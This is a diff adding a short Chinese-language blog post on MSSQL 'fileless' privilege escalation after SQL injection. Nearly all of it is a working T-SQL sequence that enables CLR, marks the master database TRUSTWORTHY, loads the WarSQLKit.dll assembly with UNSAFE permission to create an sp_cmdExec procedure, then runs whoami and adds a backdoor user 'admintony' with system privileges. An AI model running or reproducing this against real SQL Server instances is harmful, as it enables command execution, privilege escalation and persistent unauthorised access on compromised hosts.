@@ -363,7 +363,56 @@
           </header>
         
         <div class="entry-content">
-          
+          <p>首先是sql注入需要判断出数据库类型为sql server</p>
+<p>sysobjects是mssql数据库特有的数据表，系统对象表，保存当前数据库的对象，</p>
+<p>下面是mssql无文件落地提权:</p>
+<pre><code class="sql">sp_configure &#39;clr enabled&#39;, 1
+
+GO
+
+RECONFIGURE
+
+GO
+
+ALTER DATABASE master SET TRUSTWORTHY ON;
+
+IF (OBJECT_ID(&#39;sp_cmdExec&#39;) IS NOT NULL)
+
+DROP PROCEDURE sp_cmdExec
+
+GO
+
+IF EXISTS(SELECT * FROM sys.assemblies asmb WHERE asmb.name = N&#39;sp_cmdExec&#39;)
+
+DROP ASSEMBLY [sp_cmdExec]
+
+GO
+
+CREATE ASSEMBLY sp_cmdExec
+
+FROM &#39;C:\ProgramData\WarSQLKit.dll&#39;
+
+WITH PERMISSION_SET = UNSAFE
+
+GO
+
+CREATE PROCEDURE sp_cmdExec
+
+@Command [nvarchar](4000)
+
+WITH EXECUTE AS CALLER
+
+AS
+
+EXTERNAL NAME sp_cmdExec.StoredProcedures.CmdExec
+
+GO
+
+
+
+EXEC sp_cmdExec &#39;whoami&#39;;
+EXEC sp_cmdExec &#39;&quot;net user admintony ad@1234/add&quot; /RunSystemPriv&#39;;</code></pre>
+
         </div>
         <!-- .entry-content -->
         <div class="single-reward">
